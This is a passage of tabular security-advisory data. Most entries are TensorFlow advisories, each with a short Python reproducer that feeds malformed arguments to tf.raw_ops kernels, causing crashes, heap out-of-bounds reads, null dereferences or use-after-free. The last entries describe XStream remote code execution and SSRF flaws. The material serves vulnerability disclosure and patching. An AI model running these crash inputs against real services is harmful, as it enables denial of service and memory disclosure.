tf.raw_ops.MatrixDiagV3(
  diagonal=[1,0],
  k=[],
  num_rows=[1,2,3],
  num_cols=[4,5],
  padding_value=[],
  align='RIGHT_RIGHT')
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong:

```cc
  auto& diag_index = context->input(1);
  ...
  lower_diag_index = diag_index.flat<int32>()(0);
```

### Patches
We have patched the issue in GitHub commit [f2a673bd34f0d64b8e40a551ac78989d16daad09](https://github.com/tensorflow/tensorflow/commit/f2a673bd34f0d64b8e40a551ac78989d16daad09).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1719,20741,tensorflow,GHSA-4xfp-4pfp-89wg,CVE-2021-37656,https://github.com/advisories/GHSA-4xfp-4pfp-89wg,high,2021-08-25 14:42:55 UTC,Reference binding to nullptr in `RaggedTensorToSparse`,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToSparse`:

```python
import tensorflow as tf

tf.raw_ops.RaggedTensorToSparse(
  rt_nested_splits=[[0, 38, 0]],
  rt_dense_values=[])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/ragged_tensor_to_sparse_kernel.cc#L30) has an incomplete validation of the splits values: it does not check that they are in increasing order.

### Patches
We have patched the issue in GitHub commit [1071f554dbd09f7e101324d366eec5f4fe5a3ece](https://github.com/tensorflow/tensorflow/commit/1071f554dbd09f7e101324d366eec5f4fe5a3ece).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1720,20741,tensorflow,GHSA-7fvx-3jfc-2cpc,CVE-2021-37655,https://github.com/advisories/GHSA-7fvx-3jfc-2cpc,high,2021-08-25 14:42:58 UTC,Heap OOB in `ResourceScatterUpdate`,"### Impact
An attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to `tf.raw_ops.ResourceScatterUpdate`:

```python
import tensorflow as tf

v = tf.Variable([b'vvv'])
tf.raw_ops.ResourceScatterUpdate(
  resource=v.handle,
  indices=[0],
  updates=['1', '2', '3', '4', '5'])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L919-L923) has an incomplete validation of the relationship between the shapes of `indices` and `updates`: instead of checking that the shape of `indices` is a prefix of the shape of `updates` (so that broadcasting can happen), code only checks that the number of elements in these two tensors are in a divisibility relationship.

### Patches 
We have patched the issue in GitHub commit [01cff3f986259d661103412a20745928c727326f](https://github.com/tensorflow/tensorflow/commit/01cff3f986259d661103412a20745928c727326f).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
    
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
    
### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1721,20741,tensorflow,GHSA-2r8p-fg3c-wcj4,CVE-2021-37654,https://github.com/advisories/GHSA-2r8p-fg3c-wcj4,high,2021-08-25 14:43:01 UTC,Heap OOB and CHECK fail in `ResourceGather`,"### Impact
An attacker can trigger a crash via a `CHECK`-fail in debug builds of TensorFlow using `tf.raw_ops.ResourceGather` or a read from outside the bounds of heap allocated data in the same API in a release build:

```python
import tensorflow as tf

tensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)
v = tf.Variable(tensor)
tf.raw_ops.ResourceGather(
  resource=v.handle,
  indices=[0],
  dtype=tf.uint32,
  batch_dims=10,
  validate_indices=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L660-L668) does not check that the `batch_dims` value that the user supplies is less than the rank of the input tensor.

Since the implementation uses several for loops over the dimensions of `tensor`, this results in reading data from outside the bounds of heap allocated buffer backing the tensor:

```cc
    // batch_dims_ = > params.dims() (10 > 2)
    for (int i = 0; i < batch_dims_; ++i) {
      result_shape.AddDim(params.dim_size(i));
    }
    for (int i = batch_dims_; i < indices.dims(); ++i) {
      result_shape.AddDim(indices.dim_size(i));
    }
    for (int i = batch_dims_ + 1; i < params.dims(); ++i) {
      result_shape.AddDim(params.dim_size(i));
    }
```

In debug mode, `.dim_size(i)` validates that the argument is less than `.dims()` using a `DCHECK`. But the `DCHECK` is a no-op in release builds.

### Patches
We have patched the issue in GitHub commit [bc9c546ce7015c57c2f15c168b3d9201de679a1d](https://github.com/tensorflow/tensorflow/commit/bc9c546ce7015c57c2f15c168b3d9201de679a1d).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1722,20741,tensorflow,GHSA-qjj8-32p7-h289,CVE-2021-37653,https://github.com/advisories/GHSA-qjj8-32p7-h289,moderate,2021-08-25 14:43:04 UTC,Division by 0 in `ResourceGather`,"### Impact
An attacker can trigger a crash via a floating point exception in `tf.raw_ops.ResourceGather`:

```python
import tensorflow as tf

tensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)
v = tf.Variable(tensor)
tf.raw_ops.ResourceGather(
  resource=v.handle,
  indices=[0],
  dtype=tf.uint32,
  batch_dims=1,
  validate_indices=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L725-L731) computes the value of a value, `batch_size`, and then divides by it without checking that this value is not 0. 

### Patches
We have patched the issue in GitHub commit  [ac117ee8a8ea57b73d34665cdf00ef3303bc0b11](https://github.com/tensorflow/tensorflow/commit/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1723,20741,tensorflow,GHSA-m7fm-4jfh-jrg6,CVE-2021-37652,https://github.com/advisories/GHSA-m7fm-4jfh-jrg6,high,2021-08-25 14:43:07 UTC,Use after free in boosted trees creation,"### Impact
The implementation for `tf.raw_ops.BoostedTreesCreateEnsemble` can result in a use after free error if an attacker supplies specially crafted arguments:

```python
import tensorflow as tf

v= tf.Variable([0.0])
tf.raw_ops.BoostedTreesCreateEnsemble(
  tree_ensemble_handle=v.handle,
  stamp_token=[0],
  tree_ensemble_serialized=['0']) 
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/boosted_trees/resource_ops.cc#L55) uses a reference counted resource and decrements the refcount if the initialization fails, as it should. However, when the code was written, the  resource was represented as a naked pointer but later refactoring has changed it to be a smart pointer. Thus, when the pointer leaves the scope, a subsequent `free`-ing of the resource occurs, but this fails to take into account that the refcount has already reached 0, thus the resource has been already freed. During this double-free process, members of the resource object are accessed for cleanup but they are invalid as the entire resource has been freed.

### Patches
We have patched the issue in GitHub commit [5ecec9c6fbdbc6be03295685190a45e7eee726ab](https://github.com/tensorflow/tensorflow/commit/5ecec9c6fbdbc6be03295685190a45e7eee726ab).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1724,20741,tensorflow,GHSA-hpv4-7p9c-mvfr,CVE-2021-37651,https://github.com/advisories/GHSA-hpv4-7p9c-mvfr,high,2021-08-25 14:43:21 UTC,Heap buffer overflow in `FractionalAvgPoolGrad`,"### Impact
The implementation for `tf.raw_ops.FractionalAvgPoolGrad` can be tricked into accessing data outside of bounds of heap allocated buffers:

```python
import tensorflow as tf

tf.raw_ops.FractionalAvgPoolGrad(
  orig_input_tensor_shape=[0,1,2,3],
  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),
  row_pooling_sequence=[0, 0, 0, 0, 0],
  col_pooling_sequence=[-2, 0, 0, 2, 0],
  overlapping=True)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/fractional_avg_pool_op.cc#L205) does not validate that the input tensor is non-empty. Thus, code constructs an empty `EigenDoubleMatrixMap` and then accesses this buffer with indices that are outside of the empty area.

### Patches
We have patched the issue in GitHub commit [0f931751fb20f565c4e94aa6df58d54a003cdb30](https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1725,20741,tensorflow,GHSA-f8h4-7rgh-q2gm,CVE-2021-37650,https://github.com/advisories/GHSA-f8h4-7rgh-q2gm,high,2021-08-25 14:43:24 UTC,"Segfault and heap buffer overflow in `{Experimental,}DatasetToTFRecord`","### Impact
The implementation for `tf.raw_ops.ExperimentalDatasetToTFRecord` and `tf.raw_ops.DatasetToTFRecord` can trigger heap buffer overflow and segmentation fault:

```python
import tensorflow as tf

dataset = tf.data.Dataset.range(3)
dataset = tf.data.experimental.to_variant(dataset)
tf.raw_ops.ExperimentalDatasetToTFRecord(
  input_dataset=dataset,
  filename='/tmp/output',
  compression_type='')
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/to_tf_record_op.cc#L93-L102) assumes that all records in the dataset are of string type. However, there is no check for that, and the example given above uses numeric types.

### Patches
We have patched the issue in GitHub commit [e0b6e58c328059829c3eb968136f17aa72b6c876](https://github.com/tensorflow/tensorflow/commit/e0b6e58c328059829c3eb968136f17aa72b6c876).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1726,20741,tensorflow,GHSA-6gv8-p3vj-pxvr,CVE-2021-37649,https://github.com/advisories/GHSA-6gv8-p3vj-pxvr,high,2021-08-25 14:43:27 UTC,Null pointer dereference in `UncompressElement`,"### Impact
The code for `tf.raw_ops.UncompressElement` can be made to trigger a null pointer dereference: 

```python
import tensorflow as tf

data = tf.data.Dataset.from_tensors([0.0])
tf.raw_ops.UncompressElement(
  compressed=tf.data.experimental.to_variant(data),
  output_types=[tf.int64],
  output_shapes=[2])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/compression_ops.cc#L50-L53) obtains a pointer to a `CompressedElement` from a `Variant` tensor and then proceeds to dereference it for decompressing. There is no check that the `Variant` tensor contained a `CompressedElement`, so the pointer is actually `nullptr`.

### Patches
We have patched the issue in GitHub commit [7bdf50bb4f5c54a4997c379092888546c97c3ebd](https://github.com/tensorflow/tensorflow/commit/7bdf50bb4f5c54a4997c379092888546c97c3ebd).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1727,20741,tensorflow,GHSA-wp77-4gmm-7cq8,CVE-2021-37648,https://github.com/advisories/GHSA-wp77-4gmm-7cq8,high,2021-08-25 14:43:29 UTC,Incorrect validation of `SaveV2` inputs,"### Impact
The code for `tf.raw_ops.SaveV2` does not properly validate the inputs and an attacker can trigger a null pointer dereference:

```python
import tensorflow as tf

tf.raw_ops.SaveV2(
  prefix=['tensorflow'],
  tensor_name=['v'],
  shape_and_slices=[],
  tensors=[1,2,3])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/save_restore_v2_ops.cc) uses `ValidateInputs` to  check that the input arguments are valid. This validation would have caught the illegal state represented by the reproducer  above.

However, the validation uses `OP_REQUIRES` which translates to setting the `Status` object of the current `OpKernelContext` to an error status, followed by an empty `return` statement which just terminates the execution of the function it is present in. However, this does not mean that the kernel execution is finalized: instead, execution continues from the next line in `Compute` that follows the call to `ValidateInputs`. This is equivalent to lacking the validation.
      
### Patches
We have patched the issue in GitHub commit [9728c60e136912a12d99ca56e106b7cce7af5986](https://github.com/tensorflow/tensorflow/commit/9728c60e136912a12d99ca56e106b7cce7af5986).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.                                                                                                                                                                                                                                               

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1728,20741,tensorflow,GHSA-c5x2-p679-95wc,CVE-2021-37647,https://github.com/advisories/GHSA-c5x2-p679-95wc,high,2021-08-25 14:43:32 UTC,Null pointer dereference in `SparseTensorSliceDataset`,"### Impact
When a user does not supply arguments that determine a valid sparse tensor, `tf.raw_ops.SparseTensorSliceDataset` implementation can be made to dereference a null pointer:

```python
import tensorflow as tf

tf.raw_ops.SparseTensorSliceDataset(
  indices=[[],[],[]],
  values=[1,2,3],
  dense_shape=[3,3])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L240-L251) has some argument validation but fails to consider the case when either `indices` or `values` are provided for an empty sparse tensor when the other is not.

If `indices` is empty (as in the example above), then [code that performs validation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L260-L261) (i.e., checking that the indices are monotonically increasing) results in a null pointer dereference: 

```cc
    for (int64_t i = 0; i < indices->dim_size(0); ++i) {
      int64_t next_batch_index = indices->matrix<int64>()(i, 0);
      ...
    }
```

If `indices` as provided by the user is empty, then `indices` in the C++ code above is backed by an empty `std::vector`, hence calling `indices->dim_size(0)` results in null pointer dereferencing (same as calling `std::vector::at()` on an empty vector).

### Patches
We have patched the issue in GitHub commit [02cc160e29d20631de3859c6653184e3f876b9d7](https://github.com/tensorflow/tensorflow/commit/02cc160e29d20631de3859c6653184e3f876b9d7).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1729,20741,tensorflow,GHSA-h6jh-7gv5-28vg,CVE-2021-37646,https://github.com/advisories/GHSA-h6jh-7gv5-28vg,moderate,2021-08-25 14:43:34 UTC,Bad alloc in `StringNGrams` caused by integer conversion,"### Impact
The implementation of `tf.raw_ops.StringNGrams` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.

```python
import tensorflow as tf

tf.raw_ops.StringNGrams(
  data=['',''],
  data_splits=[0,2],
  separator=' '*100,
  ngram_widths=[-80,0,0,-60],
  left_pad=' ',
  right_pad=' ',
  pad_width=100,
  preserve_short_sequences=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/string_ngrams_op.cc#L184) calls `reserve` on a `tstring` with a value that sometimes can be negative if user supplies negative `ngram_widths`. The `reserve` method calls `TF_TString_Reserve` which has an `unsigned long` argument for the size of the buffer. Hence, the implicit conversion transforms the negative value to a large integer.

### Patches
We have patched the issue in GitHub commit [c283e542a3f422420cfdb332414543b62fc4e4a5](https://github.com/tensorflow/tensorflow/commit/c283e542a3f422420cfdb332414543b62fc4e4a5).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1730,20741,tensorflow,GHSA-9w2p-5mgw-p94c,CVE-2021-37645,https://github.com/advisories/GHSA-9w2p-5mgw-p94c,moderate,2021-08-25 14:43:37 UTC,Integer overflow due to conversion to unsigned,"### Impact
The implementation of `tf.raw_ops.QuantizeAndDequantizeV4Grad` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.

```python
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=[1.0,2.0],
  input=[1.0,1.0],
  input_min=[0.0],
  input_max=[10.0],
  axis=-100)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L126) uses the `axis` value as the size argument to `absl::InlinedVector` constructor. But, the constructor uses an unsigned type for the argument, so the implicit conversion transforms the negative value to a large integer.

### Patches
We have patched the issue in GitHub commit [96f364a1ca3009f98980021c4b32be5fdcca33a1](https://github.com/tensorflow/tensorflow/commit/96f364a1ca3009f98980021c4b32be5fdcca33a1).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, and TensorFlow 2.4.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1731,20741,tensorflow,GHSA-27j5-4p9v-pp67,CVE-2021-37644,https://github.com/advisories/GHSA-27j5-4p9v-pp67,moderate,2021-08-25 14:43:40 UTC,`std::abort` raised from `TensorListReserve`,"### Impact
Providing a negative element to `num_elements` list argument of  `tf.raw_ops.TensorListReserve` causes the runtime to abort the process due to reallocating a `std::vector` to have a negative number of elements:

```python
import tensorflow as tf

tf.raw_ops.TensorListReserve(
  element_shape = tf.constant([1]),
  num_elements=tf.constant([-1]),
  element_dtype = tf.int32)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/list_kernels.cc#L312) calls `std::vector.resize()` with the new size controlled by input given by the user, without checking that this input is valid.

### Patches
We have patched the issue in GitHub commit [8a6e874437670045e6c7dc6154c7412b4a2135e2](https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1732,20741,tensorflow,GHSA-fcwc-p4fc-c5cc,CVE-2021-37643,https://github.com/advisories/GHSA-fcwc-p4fc-c5cc,high,2021-08-25 14:43:42 UTC,Null pointer dereference in `MatrixDiagPartOp`,"### Impact
If a user does not provide a valid padding value to `tf.raw_ops.MatrixDiagPartOp`, then the code triggers a null pointer dereference (if input is empty) or produces invalid behavior, ignoring all values after the first:

```python
import tensorflow as tf

tf.raw_ops.MatrixDiagPartV2(
  input=tf.ones(2,dtype=tf.int32),
  k=tf.ones(2,dtype=tf.int32),
  padding_value=[])
```

Although this example is given for `MatrixDiagPartV2`, all versions of the operation are affected.

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L89) reads the first value from a tensor buffer without first checking that the tensor has values to read from.

### Patches
We have patched the issue in GitHub commit [482da92095c4d48f8784b1f00dda4f81c28d2988](https://github.com/tensorflow/tensorflow/commit/482da92095c4d48f8784b1f00dda4f81c28d2988).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1733,20741,tensorflow,GHSA-ch4f-829c-v5pw,CVE-2021-37642,https://github.com/advisories/GHSA-ch4f-829c-v5pw,moderate,2021-08-25 14:43:56 UTC,Division by 0 in `ResourceScatterDiv`,"### Impact
The implementation of `tf.raw_ops.ResourceScatterDiv` is vulnerable to a division by 0 error:

```python
import tensorflow as tf

v= tf.Variable([1,2,3])
tf.raw_ops.ResourceScatterDiv(
  resource=v.handle,
  indices=[1],
  updates=[0])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/resource_variable_ops.cc#L865) uses a common class for all binary operations but fails to treat the division by 0 case separately.

### Patches
We have patched the issue in GitHub commit [4aacb30888638da75023e6601149415b39763d76](https://github.com/tensorflow/tensorflow/commit/4aacb30888638da75023e6601149415b39763d76).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1734,20741,tensorflow,GHSA-9c8h-vvrj-w2p8,CVE-2021-37641,https://github.com/advisories/GHSA-9c8h-vvrj-w2p8,high,2021-08-25 14:43:59 UTC,Heap OOB in `RaggedGather`,"### Impact
If the arguments to `tf.raw_ops.RaggedGather` don't determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.
                                                                                                                                                                                                                                                                                          
```python
import tensorflow as tf

tf.raw_ops.RaggedGather(
  params_nested_splits = [0,0,0],
  params_dense_values = [1,1],
  indices = [0,0,9,0,0],
  OUTPUT_RAGGED_RANK=0)
```

In debug mode, the same code triggers a `CHECK` failure.

The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/ragged_gather_op.cc#L70) directly reads the first dimension of a tensor shape before checking that said tensor has rank of at least 1 (i.e., it is not a scalar). Furthermore, the implementation does not check that the list given by `params_nested_splits` is not an empty list of tensors.

### Patches
We have patched the issue in GitHub commit [a2b743f6017d7b97af1fe49087ae15f0ac634373](https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1735,20741,tensorflow,GHSA-95xm-g58g-3p88,CVE-2021-37640,https://github.com/advisories/GHSA-95xm-g58g-3p88,moderate,2021-08-25 14:44:02 UTC,Integer division by 0 in sparse reshaping,"### Impact
The implementation of `tf.raw_ops.SparseReshape` can be made to trigger an integral division by 0 exception:

```python
import tensorflow as tf

tf.raw_ops.SparseReshape(
  input_indices = np.ones((1,3)),
  input_shape = np.array([1,1,0]),
  new_shape = np.array([1,0]))
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L176-L181) calls the reshaping functor whenever there is at least an index in the input but does not check that shape of the input or the target shape have both a non-zero number of elements.

The [reshape functor](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L40-L78) blindly divides by the dimensions of the target shape. Hence, if this is not checked, code will result in a division by 0.
  
### Patches
We have patched the issue in GitHub commit [4923de56ec94fff7770df259ab7f2288a74feb41](https://github.com/tensorflow/tensorflow/commit/4923de56ec94fff7770df259ab7f2288a74feb41).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1 as this is the other affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1736,34016,com.thoughtworks.xstream:xstream,GHSA-6w62-hx7r-mw68,CVE-2021-39154,https://github.com/advisories/GHSA-6w62-hx7r-mw68,high,2021-08-25 14:46:38 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39154](https://x-stream.github.io/CVE-2021-39154.html).

### Credits
ka1n4t found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1737,34016,com.thoughtworks.xstream:xstream,GHSA-2q8x-2p7f-574v,CVE-2021-39153,https://github.com/advisories/GHSA-2q8x-2p7f-574v,high,2021-08-25 14:46:49 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream, if using the version out of the box with Java runtime version 14 to 8 or with JavaFX installed. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39153](https://x-stream.github.io/CVE-2021-39153.html).

### Credits
Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1738,34016,com.thoughtworks.xstream:xstream,GHSA-xw4p-crpj-vjx2,CVE-2021-39152,https://github.com/advisories/GHSA-xw4p-crpj-vjx2,high,2021-08-25 14:46:59 UTC,A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host,"### Impact
The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
